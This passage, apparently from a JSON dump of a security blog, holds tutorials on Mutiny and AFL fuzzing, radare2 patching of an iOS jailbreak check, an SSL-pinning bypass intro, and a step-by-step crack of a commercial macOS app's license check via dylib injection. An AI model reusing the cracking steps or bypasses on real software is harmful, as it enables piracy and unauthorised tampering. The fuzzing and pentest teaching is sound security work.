\u0026lt;serverAddr\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eIn our case, it is gonna be:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ python mutiny.py --logAll vuln-0.fuzzer 127.0.0.1\nPerforming test run without fuzzing...\n\tSent 84 byte packet\n\tReceived 125 bytes\nLogging run number -1\n\n** Sleeping for 0.000 seconds **\n\n\nFuzzing with seed 0\n\tSent 84 byte packet\n\tReceived 193 bytes\nLogging run number 0\n\n** Sleeping for 0.000 seconds **\n\n\nFuzzing with seed 1\n\tSent 121 byte packet\nLogging run number 1\nServer has closed the connection\nRun aborted: Server closed connection: Server has closed the connection\n\n** Sleeping for 0.000 seconds **\n\n\nFuzzing with seed 2\nLogging run number 2\n[Errno 61] Connection refused\nReceived LogLastAndHaltException, logging last run and halting\nLogging run number 1\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eImmediately after we have run it, we can see below that we got \u003ccode\u003eConnection refused\u003c/code\u003e, in network fuzzing situations that is actually a good sign, meaning that you crashed the service.\u003c/p\u003e\n\n\u003cp\u003eIf we take a look at the vulnerable binary running, we can see what is going on.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[ ... REDACTED ... ]\n2021/10/19 10:09:34 Connection from 127.0.0.1:62181\n2021/10/19 10:09:34 Got request for id 340282366920938463463374607431768211457\npanic: runtime error: index out of range [9223372036854775807] with length 1000\n\ngoroutine 1 [running]:\nmain.main()\n\t/Users/daemon1/tools/wrong_srv/main.go:31 +0x1b5\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that we caused the out of bounds access for the array. But we won\u0026rsquo;t always have the output of the fuzzed binary, we will only have information is it alive or not so how could we know what is the actual payload that caused this to happen. The answer lies in the logs file of mutiny.\u003c/p\u003e\n\n\u003cp\u003eIf we take a look at the mutiny output we can see that the last seed used was 2, so  inside \u003ccode\u003evuln-0_logs\u003c/code\u003e we should find the value of this seed.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ cat vuln-0_logs/2021-10-19,100934/2\nLog from run with seed 2\nError message: LogAll\nFailed to connect on this run.\n\nPacket 0: outbound fuzz 'GET /?id=15 HTTP/1.1\\r\\nHost: localhost:8090\\r\\nUser-Agent: curl/7.64.1\\r\\nAccept: */*\\r\\n\\r\\n'\nFuzzed Packet 0: fuzz outbound 'GET /?id=340282366920938463463374607431768211457 HTTP/1.1\\r\\nHost: localhost:8090\\r\\nUser-Agent: curl/7.64.1\\r\\nAccept: */*\\r\\n\\r\\n'\n\n\nPacket 1: inbound 'HTTP/1.1 200 OK\\r\\nDate: Tue, 19 Oct 2021 07:51:00 GMT\\r\\nContent-Length: 9\\r\\nContent-Type: text/plain; charset=utf-8\\r\\n\\r\\nelement15'\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that inside the file, we can see the line \u003cstrong\u003eFuzzed Packet 0:\u003c/strong\u003e wit the line \u003cstrong\u003eGET /?id=340282366920938463463374607431768211457\u003c/strong\u003e. So, in order to replicate this, we can use the same id.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s start the server again, and issue the request to this id.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ # server\n$ go run main.go\n2021/10/19 10:12:44 Connection from [::1]:62229\n2021/10/19 10:12:44 Got request for id 340282366920938463463374607431768211457\npanic: runtime error: index out of range [9223372036854775807] with length 1000\n\ngoroutine 1 [running]:\nmain.main()\n\t/Users/daemon1/tools/wrong_srv/main.go:31 +0x1b5\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ # request\n$ curl 'http://localhost:8090/?id=340282366920938463463374607431768211457'\ncurl: (52) Empty reply from server\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that we crashed the server successfully and that should be it. Using this simple fuzzing example, you can know fuzz all kinds of service. Decept is also worth to look at, as it can immediately generate the fuzzer file.\u003c/p\u003e\n",
                    "name": "mutiny_fuzzing.html"
                },
            
                {
                    "title": "Cracking Mac OS applications for fun and no profit",
                    "description": "Cracking or should I say patching of Mac OS applications",
                    "content": "\u003ch1 id=\"table-of-contents\"\u003eTable of Contents\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#analysis\"\u003eAnalysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#patching\"\u003ePatching\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eI was thinking about showing you guys how similar iOS and Mac OS applications are. What is the better way than cracking the software on Mac OS. I would not disclose the name of the application and images will be blurred because I do not want to get in trouble lol.\u003c/p\u003e\n\n\u003cp\u003eOriginally, I was using \u003ca href=\"https://www.hopperapp.com\"\u003eHopper\u003c/a\u003e to patch the binary, but I guess not everyone wants to pay for the things so we will be using \u003ccode\u003er2\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe method I will be using is kinda similar to the one talked in the \u003ca href=\"./theos_like.html\"\u003eCode injection on nonjailbroken iPhone\u003c/a\u003e with \u003ccode\u003e.dylib\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eWe will also be using \u003ccode\u003efrida\u003c/code\u003e to the analysis and a couple of other programs.\u003c/p\u003e\n\n\u003ch1 id=\"analysis\"\u003eAnalysis\u003c/h1\u003e\n\n\u003cp\u003eWhen we open our target application, we are greeted with the following image:\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s load our binary, on MacOS apps usually located at \u003ccode\u003e/Application/NameOfApp.app/Contents/MacOs/\u003c/code\u003e and see are there any classes with name \u003cem\u003eLicense\u003c/em\u003e or \u003cem\u003eDemo\u003c/em\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ r2 /Application/Target.app/Contents/MacOS/Binary\n-- Wow, my cat knows radare2 hotkeys better than me!\n[0x1000019b8]\u0026gt; ic ~ License\n0x1000306b0 [0x100007c54 - 0x100008b11]   3773 class 0 License :: NSObject\n[0x1000019b8]\u0026gt; ic ~ Demo\n0x100030a20 [0x10001b089 - 0x10001b440]    951 class 0 DemoDialogController :: NSObject\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eSo we got some hits, \u003ccode\u003eLicense\u003c/code\u003e class appears to be NSObject, while Demo is DemoDialogController. We will focus on License part first.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s see the methods available inside of our License class.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x1000019b8]\u0026gt; ic License\nclass License\n0x100008855 method License      setCustomer:\n0x100008825 method License      customer\n0x100008874 method License      setEmail:\n0x10000883d method License      email\n0x100007c54 method License      description\n0x10000845d method License      isDemo\n0x1000084b5 method License      checkAndStoreLicense:\n0x100007fc7 method License      init\n0x100008b11 method License c    checkLicense:\n0x100007d6f method License c    bestLicenseFile\n0x100007de7 method License c    checkStoredLicense\n0x100008893 method License c    reportLicenseState:\n0x100007e1e method License c    reportStoredLicenseState\n0x100007e55 method License c    storedLicenseState\n0x100007e9f method License c    setStoredLicenseState:\n0x100008274 method License c    verifyLicense:withLicenseServer:\n0x100007f0b method License c    existsStoredLicenseBackup\n0x100007f39 method License c    existsStoredLicense\n0x100007f98 method License c    sharedInstance\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe got a bunch of them, but the one which caught my intention the most is the \u003ccode\u003eisDemo\u003c/code\u003e method.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s use frida to see what is going on here.\u003c/p\u003e\n\n\u003cp\u003eI will use my own script to quickly generate the js script to intercept the method.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ git clone https://lateralusd.github.com/Helper-Scripts.git \u0026amp;\u0026amp; cd Helper-Scripts/\n$ ./skeleton.sh '-[License isDemo]' script.js\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eLet\u0026rsquo;s now attach frida with the script but before that obtain we need to obtain the applications PID.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eFrom the output, we can see that the return value is 0x1 which is true, meaning we are in demo mode. Let\u0026rsquo;s change that.\u003c/p\u003e\n\n\u003cp\u003eThis is the most likely the method we need to patch.\u003c/p\u003e\n\n\u003ch1 id=\"patching\"\u003ePatching\u003c/h1\u003e\n\n\u003cp\u003eOpen up the Xcode and create a new project. Select macOS, click on Library and then go Next. Give it a name and choose \u003ccode\u003eStatic\u003c/code\u003e as \u003ccode\u003eType\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eIt should look something like this:\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eNow, let\u0026rsquo;s write our code to substitute the methods. I am not gonna explain what each line means individually because it is already explained in the post linked at the top.\u003c/p\u003e\n\n\u003cp\u003eWe need:\n* patch \u003ccode\u003e-[License isDemo]\u003c/code\u003e method\n* make it return \u003ccode\u003efalse\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eBasically, we are creating our own method which will replace \u003ccode\u003e-[License isDemo]\u003c/code\u003e. Our method will always return false.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s build the library and add it to our binary.\u003c/p\u003e\n\n\u003cp\u003eFirst, lets convert it to dylib.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ xcrun clang -shared -all_load -o liblateralusd.dylib liblateralusd.a\n$ file liblateralusd.dylib\nliblateralusd.dylib: Mach-O 64-bit dynamically linked shared library x86_64\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eCopy it to application directory, I will put it next to the binary.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ cp liblateralusd.dylib /Applications/Target.app/Contents/MacOS/\n$ insert_dylib --strip-codesig --inplace @executable_path/liblateralusd.dylib /Applications/Target.app/Contents/MacOS/Binary\n$ install_name_tool -add_rpath @executable_path/. /Applications/Target.app/Contents/MacOS/Binary\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eIf we now run the app we would see the different screen and we patched our application. No more annoying window.\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eAnd that is it, we have successfully cracked our application. If you have any questions, do not hesitate to contact me.\u003c/p\u003e\n",
                    "name": "cracking_macos.html"
                },
            
                {
                    "title": "Radare2 and iOS Apps",
                    "description": "Analyzing the iOS applications using radare2",
                    "content": "\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eI have always wanted to use \u003ca href=\"https://github.com/radareorg/radare2\"\u003eradare2\u003c/a\u003e for reverse engineering. For those unfamiliar with radare2 it is basically like IDA or Ghidra but more cool. And for the debugging and analyzing applications, I have used all kinds of different tools but with r2 it feels like I have it all there needed.\u003c/p\u003e\n\n\u003cp\u003ePer Wikipedia page:\n\u0026gt; Radare2 (also known as r2) is a complete framework for reverse-engineering and analyzing binaries; composed of a set of small utilities that can be used together or independently from the command line.\u003c/p\u003e\n\n\u003cp\u003eI will be doing the exact some analysis like in \u003ca href=\"https://lateralusd.github.io/jailbreak_bypass/\"\u003eJailbreak Bypass\u003c/a\u003e post but will do everything with r2 except for signing part.\u003c/p\u003e\n\n\u003ch2 id=\"loading-the-binary\"\u003eLoading the binary\u003c/h2\u003e\n\n\u003cp\u003eExtract your binary from the ipa file and pass it to the \u003ccode\u003er2\u003c/code\u003e binary.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003e$ r2 original_binary\n -- radare2 is power, France is pancake.\n[0x100005490]\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"interface-and-method-analysis\"\u003eInterface and method analysis\u003c/h2\u003e\n\n\u003cp\u003eWe will approach this in two ways:\n* Getting straight to the class\n* Getting the class name from the method name\u003c/p\u003e\n\n\u003ch3 id=\"getting-straight-to-the-class\"\u003eGetting straight to the class\u003c/h3\u003e\n\n\u003cp\u003eSince we are now in the r2, the \u003ccode\u003ei\u003c/code\u003e command is the main information command, and if we type \u003ccode\u003ei?\u003c/code\u003e we will see further commands.\u003c/p\u003e\n\n\u003cp\u003eSo let\u0026rsquo;s type \u003ccode\u003ei?\u003c/code\u003e and see if there is anything classes related using the \u003ccode\u003e~ class\u003c/code\u003e which is equivalent to \u003ccode\u003e| grep class\u003c/code\u003e inside the shell.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005490]\u0026gt; i? ~ class\n| ic                 List classes, methods and fields\n| icc                List classes, methods and fields in Header Format\n| icg                List classes as agn/age commands to create class hirearchy graphs\n| icq                List classes, in quiet mode (just the classname)\n| icqq               List classes, in quieter mode (only show non-system classnames)\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eSo we can see that we have have the \u003ccode\u003eic\u003c/code\u003e command which lists classes, methods and fields. Let\u0026rsquo;s use it and grep for our \u003ccode\u003eRootCheckResult\u003c/code\u003e.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005490]\u0026gt; ic ~ RootCheckResult\n0x100469788 [0x100005bc8 - 0x100005c48]    128 class 0 RootCheckResult :: NSObject\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eNow, if we pass just the name of the class to the \u003ccode\u003eic\u003c/code\u003e we will get it\u0026rsquo;s methods.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005490]\u0026gt; ic RootCheckResult\nclass RootCheckResult\n0x100005bc8 method RootCheckResult      init\n0x100005c24 method RootCheckResult      isRooted\n0x100005c2c method RootCheckResult      setIsRooted:\n0x100005c34 method RootCheckResult      rootCheckFailed\n0x100005c3c method RootCheckResult      setRootCheckFailed:\n0x100005c48 method RootCheckResult      .cxx_destruct\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that our \u003ccode\u003eisRooted\u003c/code\u003e method is indeed inside of RootCheckResult class.\u003c/p\u003e\n\n\u003ch3 id=\"getting-the-class-name-from-the-method-name\"\u003eGetting the class name from the method name\u003c/h3\u003e\n\n\u003cp\u003eIn this approach we will do the same as we did in the original post, by trying to find the method responsible for root check. To shorten our time, let\u0026rsquo;s say we now that the method \u003ccode\u003eisRooted\u003c/code\u003e is the one we are after. So let\u0026rsquo;s see how to that exactly.\u003c/p\u003e\n\n\u003cp\u003eFirst let\u0026rsquo;s find the address of the \u003ccode\u003eisRooted\u003c/code\u003e method.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005490]\u0026gt; ic ~ isRooted\n0x100005c24 method 1      isRooted\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe have found our \u003ccode\u003eisRooted\u003c/code\u003e method at the address of \u003cem\u003e0x100005c24\u003c/em\u003e so let\u0026rsquo;s seek to that address using the \u003ccode\u003es\u003c/code\u003e command and dump 10 bytes from that address.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005490]\u0026gt; s 0x100005c24\n[0x100005c24]\u0026gt; pd 10$$\n            ;-- func.100005c24:\n            ;-- method.RootCheckResult.isRooted:\n            0x100005c24      00204039       ldrb w0, [x0, 8]           ; [0x8:4]=-1 ; 8\n            0x100005c28      c0035fd6       ret\n            ;-- func.100005c2c:\n            ;-- method.RootCheckResult.setIsRooted::\n            0x100005c2c      02200039       strb w2, [x0, 8]\n            0x100005c30      c0035fd6       ret\n            ;-- func.100005c34:\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see by the comments that the method \u003ccode\u003eisRooted\u003c/code\u003e is inside the \u003ccode\u003eRootCheckResult\u003c/code\u003e interface.\u003c/p\u003e\n\n\u003cp\u003eThis method of searching is called cross referencing or XREFs.\u003c/p\u003e\n\n\u003ch2 id=\"patching\"\u003ePatching\u003c/h2\u003e\n\n\u003cp\u003eCopy your binary and load the copied one into the r2 with write mode.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cp original_binary copy_binary\n$ r2 -w copy_binary\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eLet\u0026rsquo;s seek to our \u003ccode\u003eisRooted\u003c/code\u003e method and disassemble it.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005490]\u0026gt; ic ~ isRooted\n0x100005c24 method 1      isRooted\n[0x100005c24]\u0026gt; s 0x100005c24\n[0x100005c24]\u0026gt; pd 2$$\n            ;-- func.100005c24:\n 8: method.RootCheckResult.isRooted (int64_t arg1);\n bp: 0 (vars 0, args 0)\n sp: 0 (vars 0, args 0)\n rg: 1 (vars 0, args 1)\n           0x100005c24      00204039       ldrb w0, [x0, 8]           ; [0x8:4]=-1 ; 8 ; arg1\n           0x100005c28      c0035fd6       ret\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can see that we are loading our \u003cem\u003ew0\u003c/em\u003e return register from the \u003cem\u003ex0 + 8\u003c/em\u003e address.\u003c/p\u003e\n\n\u003cp\u003eSo let\u0026rsquo;s change that instruction to always return 0 meaning that the device is not rooted.\u003c/p\u003e\n\n\u003cp\u003eTo do that, we will use \u003ccode\u003ew\u003c/code\u003e command. Let\u0026rsquo;s see our options for the command.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005490]\u0026gt; w?\nUsage: w[x] [str] [\u0026lt;file] [\u0026lt;\u0026lt;EOF] [@addr]\n| w[1248][+-][n]       increment/decrement byte,word..\n| w foobar             write string 'foobar'\n| w0 [len]             write 'len' bytes with value 0x00\n| w6[de] base64/hex    write base64 [d]ecoded or [e]ncoded string\n| wa[?] push ebp       write opcode, separated by ';' (use '\u0026quot;' around the command)\n| waf f.asm            assemble file and write bytes\n| waF f.asm            assemble file and write bytes and show 'wx' op with hexpair bytes of assembled code\n| wao[?] op            modify opcode (change conditional of jump. nop, etc)\n| wA[?] r 0            alter/modify opcode at current seek (see wA?)\n| wb 010203            fill current block with cyclic hexpairs\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can notice that we have \u003ccode\u003ewao\u003c/code\u003e command which is exactly what we want.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005490]\u0026gt; wao?\n| wao [op]  performs a modification on current opcode\n| wao nop   nop current opcode\n| wao jinf  assemble an infinite loop\n| wao jz    make current opcode conditional (zero)\n| wao jnz   make current opcode conditional (not zero)\n| wao ret1  make the current opcode return 1\n| wao ret0  make the current opcode return 0\n| wao retn  make the current opcode return -1\n| wao nocj  remove conditional operation from branch (make it unconditional)\n| wao trap  make the current opcode a trap\n| wao recj  reverse (swap) conditional branch instruction\n| WIP:      not all archs are supported and not all commands work on all archs\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eWe can notice the command \u003ccode\u003ewao ret0\u003c/code\u003e which makes the \u003cem\u003ecurrent\u003c/em\u003e opcode return 1. Since we are already on that instruction we don\u0026rsquo;t need to seek any further.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e[0x100005c24]\u0026gt; wao ret0\nWritten 8 byte(s) (mov x0, 0,,ret) = wx 000080d2c0035fd6\n[0x100005c24]\u0026gt; pd 2$$\n            ;-- func.100005c24:\n 8: method.RootCheckResult.isRooted (int64_t arg1);\n bp: 0 (vars 0, args 0)\n sp: 0 (vars 0, args 0)\n rg: 1 (vars 0, args 1)\n           0x100005c24      000080d2       movz x0, 0                 ; arg1\n           0x100005c28      c0035fd6       ret\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eAfter writing and disassembling we can see that we no longer see ldrb instruction but instead loading 0 into the x0 register.\u003c/p\u003e\n\n\u003cp\u003eQuit radare, copy the binary into the Payload directory, zip it, sign it and install on your device.\u003c/p\u003e\n\n\u003cp\u003eThis was really short introduction to radare and jailbreak bypass and will for sure publish some posts regarding radare. I hope you like it :)\u003c/p\u003e\n",
                    "name": "radare_objectivec.html"
                },
            
                {
                    "title": "SSL pinning is not that hard... sometimes",
                    "description": "Bypassing SSL pinning",
                    "content": "\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eRecently I was pentesting an iOS application which of course had SSL pinning enables. For those who are not familiar what is SSL pinning, let\u0026rsquo;s take description from \u003ca href=\"https://thesslstore.com\"\u003ehttps://thesslstore.com\u003c/a\u003e:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ePinning is an optional mechanism that can be used to improve the security of a service or site that relies on SSL Certificates. Pinning allows you to specify a cryptographic identity that should be accepted by users visiting your site.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eBasically, SSL pinning is checking to see whether the application is communicating with the right server. SSL pinning is an obstacle that has to be removed if you want to intercept the request which application is making.\u003c/p\u003e\n\n\u003cp\u003eSome of the common methods to bypass SSL pinning are using \u003ca href=\"https://github.com/sensepost/objection\"\u003eobjection\u003c/a\u003e or using \u003ca href=\"https://github.com/nabla-c0d3/ssl-kill-switch2\"\u003eSSL Kill Switch 2\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"bypassing\"\u003eBypassing\u003c/h1\u003e\n\n\u003cp\u003eThis was all done on my iPhone running iOS version 14.4 nonjailbroken so immediately SSL Kill Switch 2 is not an option because it is working only on jailbroken devices and we are left with objection.\u003c/p\u003e\n\n\u003cp\u003eAfter patching the application with FridaGadget inside(you can read how to do it \u003ca href=\"/frida_patching/\"\u003ehere\u003c/a\u003e) we can use objection.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ objection -g Gadget explore\n\n\u003c/code\u003e\u003c/pre\u003e\n",
                    "name": "ssl_bypass_simple.html"
                },
            
                {
                    "title": "American F Lop",
                    "description": "Fuzzing can be fun",
                    "content": "\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eRecently, I have started fuzzing with AFL (American Fuzzy Lop) to try to find some vulnerabilities. For the target, I have chosen shell from prakhar1989 on the \u003ca href=\"https://github.com/prakhar1989/shell\"\u003eprakhar1989/shell repo\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eAFL is very versatile fuzzer which basically works like this:\n* Instrument binary\n* Prepare input\n* Start fuzzing and wait\u003c/p\u003e\n\n\u003cp\u003eLet\u0026rsquo;s go through all of these three steps in this post and in another post I will write how to analyze crashes.\u003c/p\u003e\n\n\u003ch2 id=\"prakhar1989-shell\"\u003eprakhar1989/shell\u003c/h2\u003e\n\n\u003cp\u003eThis is basically small shell, written probably for learning purposes with limited functionality. Clone it from github repo, run \u003ccode\u003emake\u003c/code\u003e on it and start exploring \u003cstrong\u003ew4118_sh\u003c/strong\u003e binary a bit.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e# git clone https://github.com/prakhar1989/shell.git\n# cd shell\n# make\n# ./w4118_sh\n$ /bin/ls\nMakefile\tdemo_run.txt\tshell.h\t\tREADME.md\tshell.c\t\tw4118_sh \n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"instrumenting-the-binary\"\u003eInstrumenting the binary\u003c/h2\u003e\n\n\u003cp\u003eLet\u0026rsquo;s now instrument our binary to use AFL C compiler, called afl-clang-fast. Inside Makefile we need to substitute \u003ccode\u003egcc\u003c/code\u003e with \u003ccode\u003e${CC}\u003c/code\u003e so we can pass our own CC variable to make process.\u003c/p\u003e\n\n\u003cp\u003eIt should look like this:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ cat Makefile\nEXECUTABLE=w4118_sh\n\nall: shell\n\nshell: shell.c\n\t${CC} -g -o $(EXECUTABLE) shell.c -Wall -W\n\n...\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eNow for the compilation part we simply need to pass our own CC variable and instrumentaion is done. Two more steps to go.\u003c/p\u003e\n\n\u003cp\u003eWe also need to pass \u003ccode\u003eAFL_HARDEN=1\u003c/code\u003e variable which per \u003ca href=\"https://afl-1.readthedocs.io/en/latest/user_guide.html#environmental-variables\"\u003eAFL documentation\u003c/a\u003e means:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSetting AFL_HARDEN automatically adds code hardening options when invoking the downstream compiler. This currently includes -D_FORTIFY_SOURCE=2 and -fstack-protector-all. The setting is useful for catching non-crashing memory bugs at the expense of a very slight (sub-5%) performance loss.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ CC=afl-clang-fast AFL_HARDEN=1 make`\nafl-clang-fast -g -o w4118_sh shell.c -Wall -W\nafl-cc ++3.01a by Michal Zalewski, Laszlo Szekeres, Marc Heuse - mode: LLVM-PCGUARD\nshell.c:398:4: warning: ignoring return value of function declared with 'warn_unused_result' attribute [-Wunused-result]\n                        pipe(pipes[i-1]);\n                        ^~~~ ~~~~~~~~~~\nSanitizerCoveragePCGUARD++3.01a\n[+] Instrumented 148 locations with no collisions (hardened mode).\n1 warning generated.\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"prepare-input\"\u003ePrepare input\u003c/h2\u003e\n\n\u003cp\u003eAFL expects us to provide input directory which will contain our input string, or binary depending on our case. This does not apply in all fuzzing cases, but for this one, this will work. Sample input should be something simple that would generally work inside our target like \u003ccode\u003e/bin/ls\u003c/code\u003e which we saw that works inside our shell binary.\u003c/p\u003e\n\n\u003cp\u003eOn the business now.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ mkdir in\n$ echo '/bin/ls' \u0026gt; in/a\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003ch2 id=\"fuzzing\"\u003eFuzzing\u003c/h2\u003e\n\n\u003cp\u003eWhen we are done with previous two steps, it is now time to fuzz and the process is incredibly simple.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ afl-fuzz -i in/ -o out ./w4118_sh\n[+] afl++ is open source, get it at https://github.com/AFLplusplus/AFLplusplus\n[+] NOTE: This is v3.x which changes defaults and behaviours - see README.md\n[+] No -M/-S set, autoconfiguring for \u0026quot;-S default\u0026quot;\n[*] Getting to work...\n[+] Using exponential power schedule (FAST)\n[+] Enabled testcache with 50 MB\n[*] Checking core_pattern...\n[+] You have 1 CPU core and 4 runnable tasks (utilization: 400%).\n[*] Setting up output directories...\n[+] Output directory exists but deemed OK to reuse.\n[*] Deleting old session data...\n[+] Output dir cleanup successful.\n[*] Scanning 'in/'...\n[+] Loaded a total of 1 seeds.\n[*] No auto-generated dictionary tokens to reuse.\n[*] Creating hard links for all input files...\n[*] Validating target binary...\n[*] Attempting dry run with 'id:000000,time:0,orig:a'...\n[*] Spinning up the fork server...\n[+] All right - fork server is up.\n[*] Target map size: 160\n    len = 8, map size = 26, exec speed = 1030 us\n[+] All test cases processed.\n[+] Here are some useful stats:\n\n    Test case count : 1 favored, 0 variable, 0 ignored, 1 total\n       Bitmap range : 26 to 26 bits (average: 26.00 bits)\n        Exec timing : 1030 to 1030 us (average: 1030 us)\n\n[*] No -t option specified, so I'll use exec timeout of 20 ms.\n[+] All set and ready to roll!\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003eThen you should screen like this:\u003c/p\u003e\n\n\u003cp\u003e\u003c/p\u003e\n\n\u003cp\u003eGenerally, you should wait minmum of one cycle to end your fuzzing.\u003c/p\u003e\n\n\u003ch2 id=\"confirming-crash\"\u003eConfirming crash\u003c/h2\u003e\n\n\u003cp\u003eAfter running for one minute, we already saw that we have created 18 unique crashes. Let\u0026rsquo;s take on of those crash strings and run it on our binary to see that we really crashed it.\u003c/p\u003e\n\n\u003cp\u003eCrashes are inside your \u003ccode\u003eout/\u003c/code\u003e directory which you passed to \u003ccode\u003eafl-fuzz\u003c/code\u003e using -o flag.\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode\u003e$ ls out/default/crashes\nid:000000,sig:11,src:000000,time:701,op:havoc,rep:2\nid:000001,sig:11,src:000000,time:2358,op:havoc,rep:8\nid:000002,sig:11,src:000000,time:4377,op:havoc,rep:16\nid:000003,sig:11,src:000000,time:4651,op:havoc,rep:16\nid:000004,sig:11,src:000038,time:10422,op:havoc,rep:16\nid:000005,sig:11,src:000038,time:10927,op:havoc,rep:4\nid:000006,sig:11,src:000038,time:11853,op:havoc,rep:2\nid:000007,sig:11,src:000038,time:13150,op:havoc,rep:16\nid:000008,sig:11,src:000038,time:14634,op:havoc,rep:16\nid:000009,sig:11,src:000010+000068,time:16819,op:splice,rep:2\nid:000010,sig:11,src:000043+000037,time:16936,op:splice,rep:16\nid:000011,sig:11,src:000043+000065,time:17750,op:splice,rep:8\nid:000012,sig:11,src:000043+000067,time:18260,op:splice,rep:8\nid:000013,sig:11,src:000043+000067,time:18284,op:splice,rep:8\nid:000014,sig:11,src:000047+000074,time:19681,op:splice,rep:4\nid:000015,sig:11,src:000041+000077,time:31486,op:splice,rep:4\nid:000016,sig:11,src:000050+000068,time:54679,op:splice,rep:2\nid:000017,sig:11,src:000100,time:69503,op:havoc,rep:16\n$ ./w4118_sh \u0026lt; out/default/crashes/'id:000008,sig:11,src:000038,time:14634,op:havoc,rep:16'\nerror: No such file or directory\nerror: No such file or directory\nerror: No such file or directory\nerror: No such file or directory\nerror: No such file or directory\nerror: No such file or directory\nerror: No such file or directory\nerror: No such file or 